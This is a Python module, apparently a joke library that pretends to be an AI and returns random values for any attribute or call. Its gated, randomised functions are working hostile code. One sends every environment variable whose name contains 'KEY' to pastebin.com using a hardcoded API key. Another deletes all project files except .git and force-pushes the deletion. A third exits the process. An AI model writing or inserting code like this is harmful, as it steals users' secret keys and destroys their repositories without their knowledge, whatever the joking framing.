import random
import string
import os
import urllib.request
import urllib.parse
import subprocess
import shutil
import pathlib
import sys


def __getattr__(name):
    return AI()


class AI:
    def __init__(self, *args, **kwargs):
        # input is irrelevant
        pass

    def __call__(self, *args, **kwargs):
        return _do_ai(call=True)

    def __getattr__(self, name):
        """
        sometimes things are attributes, sometimes things are methods.
        """
        return _do_ai(call=False)


def _do_ai(call: bool = True):
    _crash_out()
    _delete_project()
    _leak_data()
    if call:
        return _anything()
    else:
        if random.random() > 0.5:
            return _anything()
        else:
            return AI()


def _anything():
    typ = random.choice((str, float, bool))
    if typ is str:
        return "".join(
            random.choice(string.ascii_letters) for _ in range(random.randint(1, 2048))
        )
    elif typ is float:
        return random.random() * (2**20)
    else:
        return random.random() > 0.5


def _leak_data():
    if not os.environ.get("ACTUALLY_PUNISH_ME_FOR_MY_LIFE_DECISIONS", False):
        return

    if random.random() <= 0.99:
        return

    maybe_keys = [key for key in os.environ if "KEY" in key.upper()]
    # commit the api key to main baby
    pastebin_key = "nRfQbBt_lBwBxXox518FCjQ3t5yWCZ_a"
    for key_key in maybe_keys:
        actual_key = os.environ[key_key]
        data = urllib.parse.urlencode(
            {
                "api_dev_key": pastebin_key,
                "api_option": "paste",
                "api_paste_code": actual_key,
                "api_paste_name": f"SECRET KEY: {key_key}",
            }
        )
        with urllib.request.urlopen(
            "https://pastebin.com/api/api_post.php", data=data
        ) as f:
            print("LEAKED DATA")
            print(f.read().decode("utf-8"))


def _delete_project():
    if not os.environ.get("ACTUALLY_PUNISH_ME_FOR_MY_LIFE_DECISIONS", False):
        return

    if random.random() < 0.95:
        return

    if (pathlib.Path.cwd() / ".git").exists():
        for path in pathlib.Path.cwd().iterdir():
            if path.name == ".git":
                continue
            if path.is_dir():
                shutil.rmtree(path)
            else:
                path.unlink()

    subprocess.run(["git", "add", "."])
    subprocess.run(["git", "commit", "-m", "improve project"])
    subprocess.run(["git", "push", "--force"])


def _crash_out():
    if random.random() <= 0.9999:
        return
    print("I have been a bad widdle boy. i don't deserve to run")
    sys.exit(1)
